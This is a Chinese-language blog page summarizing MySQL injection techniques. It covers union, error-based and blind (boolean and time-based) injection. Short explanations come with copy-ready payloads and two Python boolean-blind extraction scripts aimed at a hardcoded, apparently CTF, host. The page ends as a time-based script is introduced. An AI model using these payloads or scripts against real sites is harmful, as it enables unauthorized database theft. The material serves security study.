@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>SQL注入总结 | Aruk4s</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="SQL,web,">
+  
+
+  <meta name="description" content="SQL注入一、联合注入：常用函数：123group_concat：以逗号连接查询出来的数据limit: limit 0,1 //从第一行往后查1行。第一个数代表从第n+1行开始，第二个数代表往后几行。information_schema：保存了MySQL数据库服务器中所有的数据库的信息  Payload：1234爆库：1&amp;apos; union select group_concat(schema">
+<meta name="keywords" content="SQL,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入总结">
+<meta property="og:url" content="http://yoursite.com/2020/11/04/SQL注入/index.html">
+<meta property="og:site_name" content="Aruk4s">
+<meta property="og:description" content="SQL注入一、联合注入：常用函数：123group_concat：以逗号连接查询出来的数据limit: limit 0,1 //从第一行往后查1行。第一个数代表从第n+1行开始，第二个数代表往后几行。information_schema：保存了MySQL数据库服务器中所有的数据库的信息  Payload：1234爆库：1&amp;apos; union select group_concat(schema">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201112185417.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201112185437.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114160130.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114160554.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114185322.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114185433.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201116163817.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130211424.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130212647.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20201130212726104.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130214617.png">
+<meta property="og:updated_time" content="2020-12-28T13:58:56.235Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入总结">
+<meta name="twitter:description" content="SQL注入一、联合注入：常用函数：123group_concat：以逗号连接查询出来的数据limit: limit 0,1 //从第一行往后查1行。第一个数代表从第n+1行开始，第二个数代表往后几行。information_schema：保存了MySQL数据库服务器中所有的数据库的信息  Payload：1234爆库：1&amp;apos; union select group_concat(schema">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201112185417.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、联合注入："><span class="toc-text">一、联合注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用函数："><span class="toc-text">常用函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload："><span class="toc-text">Payload：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、报错注入："><span class="toc-text">二、报错注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Floor："><span class="toc-text">1.Floor：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理："><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用函数"><span class="toc-text">使用函数:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload：-1"><span class="toc-text">Payload：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Extractvalue"><span class="toc-text">2.Extractvalue:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理：-1"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload：-2"><span class="toc-text">Payload：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Updatexml："><span class="toc-text">3.Updatexml：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理：-2"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload"><span class="toc-text">Payload:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-列名重复报错："><span class="toc-text">4.列名重复报错：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理：-3"><span class="toc-text">原理：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-其他报错注入："><span class="toc-text">5.其他报错注入：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、盲注："><span class="toc-text">三、盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-布尔盲注："><span class="toc-text">1.布尔盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理：-4"><span class="toc-text">原理：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-True-or-Falese："><span class="toc-text">1.True or Falese：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Payload：-3"><span class="toc-text">Payload：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-order-by"><span class="toc-text">2.order by:</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Payload：-4"><span class="toc-text">Payload：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-时间盲注："><span class="toc-text">2.时间盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理：-5"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常用函数：-1"><span class="toc-text">常用函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-常用-sleep"><span class="toc-text">1.(常用)sleep():</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Payload：-5"><span class="toc-text">Payload：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-benchmark"><span class="toc-text">2.benchmark():</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Payload：-6"><span class="toc-text">Payload：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-笛卡尔积："><span class="toc-text">3.笛卡尔积：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Payload：-7"><span class="toc-text">Payload：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-GET-LOCK："><span class="toc-text">4.GET_LOCK：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-Rlike-rpad（MySQL5-7）："><span class="toc-text">5.Rlike+rpad（MySQL5.7）：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Payload：-8"><span class="toc-text">Payload：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、堆叠注入-预编译："><span class="toc-text">四、堆叠注入+预编译：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五、无列名注入："><span class="toc-text">五、无列名注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理：-6"><span class="toc-text">原理：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一些小Ticks："><span class="toc-text">一些小Ticks：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-SQL注入" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">SQL注入总结</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2020.11.04</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>Aruk4s</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/Summary/">Summary</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="一、联合注入："><a href="#一、联合注入：" class="headerlink" title="一、联合注入："></a>一、联合注入：</h2><h3 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">group_concat：以逗号连接查询出来的数据</span><br><span class="line">limit: limit 0,1 //从第一行往后查1行。第一个数代表从第n+1行开始，第二个数代表往后几行。</span><br><span class="line">information_schema：保存了MySQL数据库服务器中所有的数据库的信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆库：1&apos; union select group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">爆表：1&apos; union select group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">爆列：1&apos; union select group_concat(column_name) from information_schema.columns where table_name = &apos;表&apos;</span><br><span class="line">爆字段：1&apos; union select 列名 from 表名</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、报错注入："><a href="#二、报错注入：" class="headerlink" title="二、报错注入："></a>二、报错注入：</h2><h3 id="1-Floor："><a href="#1-Floor：" class="headerlink" title="1.Floor："></a>1.Floor：</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><ol>
+<li><p>查询前默认会建立空的虚拟表。</p>
+</li>
+<li><p>取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕。</p>
+</li>
+<li><p>查询第二条记录，再次计算floor(rand(0)<em>2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)\</em>2)不会被计算第二次，直接count()加1，第二条记录查询完毕。</p>
+</li>
+<li><p>查询第三条记录，再次计算floor(rand(0)<em>2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据（存入的动作已经发生），在插入数据时floor(rand(0)\</em>2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</p>
+</li>
+<li><p>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p>
+</li>
+<li><p>在floor(rand(1)<em>2)等floor(rand(x)*2)中，在虚表中会把0，1作为键值存入，所以后面不管查询到多少数据，只会增加count(\</em>)的字段数量，而不会报错</p>
+<p>成功报错：</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201112185417.png" alt></p>
+<p>失败：</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201112185437.png" alt></p>
+</li>
+</ol>
+<h4 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数:"></a>使用函数:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rand()：取0-1之间的随机浮点数值</span><br><span class="line">rand(x)：每个rand(x)代表一个固定随机数</span><br><span class="line">floor(x)：返回X值的最大整数值，但是不能大于X，向下取整</span><br><span class="line">group_by：按列名进行分组，一般配合count(*)进行统计数量</span><br><span class="line">count(*)：对表中的数字行进行统计</span><br></pre></td></tr></table></figure>
+
+<h4 id="Payload：-1"><a href="#Payload：-1" class="headerlink" title="Payload："></a>Payload：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(payload,floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Extractvalue"><a href="#2-Extractvalue" class="headerlink" title="2.Extractvalue:"></a>2.Extractvalue:</h3><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h4><p>extract的第二个参数要求是<code>xpath格式字符串</code>，所以我们已用这一个特性，进行报错，最大长度是32位，超过32位不显示</p>
+<h4 id="Payload：-2"><a href="#Payload：-2" class="headerlink" title="Payload："></a>Payload：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(payload),0x7e)));</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Updatexml："><a href="#3-Updatexml：" class="headerlink" title="3.Updatexml："></a>3.Updatexml：</h3><h4 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h4><p>和extractvalue相同，最大长度同样是32位</p>
+<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (updatexml(1,concat(0x7e,(payload),0x7e),1));</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-列名重复报错："><a href="#4-列名重复报错：" class="headerlink" title="4.列名重复报错："></a>4.列名重复报错：</h3><h4 id="原理：-3"><a href="#原理：-3" class="headerlink" title="原理："></a>原理：</h4><p>限制版本：Mysql 5.0.12 &lt;= 版本 &lt;= Mysql 5.0.51</p>
+<p>在MySQL中，当列名重复了会发生报错，我们可以<code>name_const</code>来制造一个列，但是函数的参数要求必须是常量，所以限制比较大，在实际的测试中通常搭配<code>join</code>函数来使用</p>
+<h3 id="5-其他报错注入："><a href="#5-其他报错注入：" class="headerlink" title="5.其他报错注入："></a>5.其他报错注入：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1.geometrycollection()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">2.multipoint()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">3.polygon()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">4.multipolygon()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.linestring()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.multilinestring()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.exp()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、盲注："><a href="#三、盲注：" class="headerlink" title="三、盲注："></a>三、盲注：</h2><h3 id="1-布尔盲注："><a href="#1-布尔盲注：" class="headerlink" title="1.布尔盲注："></a>1.布尔盲注：</h3><h4 id="原理：-4"><a href="#原理：-4" class="headerlink" title="原理："></a>原理：</h4><p>布尔盲注有两种情况，一种是通过页面返回True和False，进行判断，第二种是Order by盲注</p>
+<h5 id="1-True-or-Falese："><a href="#1-True-or-Falese：" class="headerlink" title="1.True or Falese："></a>1.True or Falese：</h5><p>通过判断ascii码的大小来猜测字段名，表名等数据</p>
+<h6 id="Payload：-3"><a href="#Payload：-3" class="headerlink" title="Payload："></a>Payload：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and 1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=%d) -- -</span><br></pre></td></tr></table></figure>
+
+<p>通过这个原理我们可以写出脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#普通盲注脚本</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url= <span class="string">"http://47.96.135.208:8802/web2/search.php"</span></span><br><span class="line">s = <span class="string">','</span>+<span class="string">'_'</span>+string.ascii_lowercase+<span class="string">'1234567890'</span>+string.ascii_uppercase+<span class="string">'&#123;'</span>+<span class="string">'&#125;'</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    print(i,<span class="string">':'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment">#sql = "1' and 1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d)-- -"%(i,ord(j)) #爆表名</span></span><br><span class="line">        <span class="comment">#sql = "1' and 1=(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='f111ag'),%d,1))=%d)-- -"%(i,ord(j)) #爆字段名</span></span><br><span class="line">        sql = <span class="string">"1' and 1=(ord(mid((select group_concat(flag) from f111ag),%d,1))= %d)-- -"</span>%(i,ord(j))</span><br><span class="line">        data = &#123;<span class="string">"id"</span> : sql&#125;</span><br><span class="line">        r = requests.get(url,params=data,timeout=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Click"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            p += j</span><br><span class="line">            print(p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#二分法盲注脚本</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url= <span class="string">"http://47.96.135.208:8802/web2/search.php"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span><span class="params">(i,j)</span>:</span></span><br><span class="line">    <span class="comment">#sql = "1' and 1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d)-- -"%(i,j) #爆表名</span></span><br><span class="line">    <span class="comment">#sql = "1' and 1=(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='f111ag'),%d,1))&gt;%d)-- -"%(i,j) #爆字段名</span></span><br><span class="line">    sql = <span class="string">"1' and 1=(ord(mid((select group_concat(flag) from f111ag),%d,1))&gt;%d)-- -"</span> % (i,j)</span><br><span class="line">    data=&#123;<span class="string">"id"</span>:sql&#125;</span><br><span class="line">    r=requests.get(url,params=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Click"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        print(i,<span class="string">':'</span>)</span><br><span class="line">        low = <span class="number">31</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">            mid = (low+high)//<span class="number">2</span></span><br><span class="line">            res = payload(i,mid)</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">        f = int((low + high +<span class="number">1</span>))//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (f==<span class="number">127</span> <span class="keyword">or</span> f==<span class="number">31</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag += chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line">exp()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-order-by"><a href="#2-order-by" class="headerlink" title="2.order by:"></a>2.order by:</h5><p>在MySQL中<code>order by rand(True)</code>和<code>order by rand(False)</code>的结果排序是不同的：</p>
+<img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114160130.png">
+
+<h6 id="Payload：-4"><a href="#Payload：-4" class="headerlink" title="Payload："></a>Payload：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by rand(database()=&apos;php&apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114160554.png" alt></p>
+<p>和True的顺序符合，所以当前数据库为php，可以利用这个特性，进行布尔盲注，猜测数据库里的内容</p>
+<h3 id="2-时间盲注："><a href="#2-时间盲注：" class="headerlink" title="2.时间盲注："></a>2.时间盲注：</h3><h4 id="原理：-5"><a href="#原理：-5" class="headerlink" title="原理："></a>原理：</h4><p>有时候注入的页面既不会报错，也不会回显是否正确，这个时候我们需要用延时来判断，我们查询的结果是否正确。</p>
+<h4 id="常用函数：-1"><a href="#常用函数：-1" class="headerlink" title="常用函数："></a>常用函数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sleep(x)：使查询结果返回的时间延迟x秒</span><br><span class="line">ord()：返回字符串的第一个字符的ascii值</span><br><span class="line">benchmark(count,expr)：重复计算expr表达式count次，达到延时</span><br><span class="line">ascii()：返回字母的ascii码值</span><br><span class="line">substr(string string,num start,num length)：截取字符串，string被截取字符串，start为起始位置，length为长度</span><br><span class="line">mid(string, start, length)：截取去字符串，string被截取字符串，start为起始位置，length为长度</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-常用-sleep"><a href="#1-常用-sleep" class="headerlink" title="1.(常用)sleep():"></a>1.(常用)sleep():</h5><p>通过sleep的延时来判断，查询的结果是否正确。</p>
+<h6 id="Payload：-5"><a href="#Payload：-5" class="headerlink" title="Payload："></a>Payload：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and if(1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=%d),sleep(3),1) -- -</span><br></pre></td></tr></table></figure>
+
+<p>脚本如下：</p>
